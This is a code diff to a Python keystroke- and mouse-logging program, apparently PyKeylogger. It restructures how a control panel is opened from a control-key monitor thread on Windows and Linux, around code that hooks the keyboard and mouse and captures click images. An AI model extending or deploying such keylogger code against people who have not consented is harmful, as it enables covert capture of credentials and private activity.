@@ -62,7 +62,8 @@ class KeyLogger:
         self.q_imagewriter = Queue.Queue(0)
         self.lw = LogWriter(self.settings, self.cmdoptions, self.q_logwriter)
         self.iw = ImageWriter(self.settings, self.cmdoptions, self.q_imagewriter)
-        self.hashchecker = ControlKeyMonitor(self.cmdoptions, self.lw, self, self.ControlKeyHash)
+        if os.name == 'posix':
+            self.hashchecker = ControlKeyMonitor(self.cmdoptions, self.lw, self, self.ControlKeyHash)
         
         self.hm = hooklib.HookManager()
         
@@ -74,10 +75,9 @@ class KeyLogger:
         if self.settings['Image Capture']['Capture Clicks'] == True:
             self.hm.HookMouse()
             self.hm.MouseAllButtonsDown = self.OnMouseDownEvent
-            #self.hm.MouseAllButtonsDown = lambda x: True # do nothing
-            
-        #~ elif os.name == 'posix':
-            #~ self.hm = pyxhook.pyxhook(captureclicks = self.settings['Image Capture']['Capture Clicks'], clickimagedimensions = {"width":self.settings['Image Capture']['Capture Clicks Width'], "height":self.settings['Image Capture']['Capture Clicks Height']}, logdir = self.settings['General']['Log Directory'], KeyDown = self.OnKeyDownEvent, KeyUp = self.OnKeyUpEvent)
+        
+        #if os.name == 'nt':
+        self.panel = False
         
         #if self.options.hookMouse == True:
         #   self.hm.HookMouse()
@@ -88,10 +88,9 @@ class KeyLogger:
         if os.name == 'nt':
             pythoncom.PumpMessages()
         if os.name == 'posix':
+            self.hashchecker.start()
             self.hm.start()
-            
-        self.hashchecker.start()
-           
+        
     def ParseControlKey(self):
         self.ControlKeyHash = ControlKeyHash(self.settings['General']['Control Key'])
         
@@ -108,7 +107,21 @@ class KeyLogger:
         
         if self.cmdoptions.debug:
                 self.lw.PrintDebug("control key status: " + str(self.ControlKeyHash))
-            
+                
+        # have to open the panel from main thread on windows, otherwise it hangs.
+        # possibly due to some interaction with the python message pump and tkinter?
+        # 
+        # on linux, on the other hand, doing it from a separate worker thread is a must
+        # since the pyxhook module blocks until panel is closed, so we do it with the 
+        # hashchecker thread instead.
+        if os.name == 'nt': 
+            if self.ControlKeyHash.check():
+                if not self.panel:
+                    self.lw.PrintDebug("starting panel")
+                    self.panel = True
+                    self.ControlKeyHash.reset()
+                    PyKeyloggerControlPanel(self.cmdoptions, self)
+        
         return True
     
     def OnKeyUpEvent(self,event):
@@ -125,9 +138,10 @@ class KeyLogger:
         
         if os.name == 'posix':
             self.hm.cancel()
+            self.hashchecker.cancel()
         self.lw.cancel()
         self.iw.cancel()
-        self.hashchecker.cancel()
+        
         #print threading.enumerate()
         sys.exit()
     
@@ -280,7 +294,7 @@ class ControlKeyMonitor(threading.Thread):
         
         # panel flag - true if panel is up, false if not
         # this way we don't start a second panel instance when it's already up
-        self.panel=False
+        #self.panel=False
         
         self.lw = logwriter
         self.mainapp = mainapp
@@ -290,9 +304,9 @@ class ControlKeyMonitor(threading.Thread):
     def run(self):
         while not self.finished.isSet():
             if self.ControlKeyHash.check():
-                if not self.panel:
+                if not self.mainapp.panel:
                     self.lw.PrintDebug("starting panel")
-                    self.panel = True
+                    self.mainapp.panel = True
                     self.ControlKeyHash.reset()
                     PyKeyloggerControlPanel(self.cmdoptions, self.mainapp)
             time.sleep(0.05)
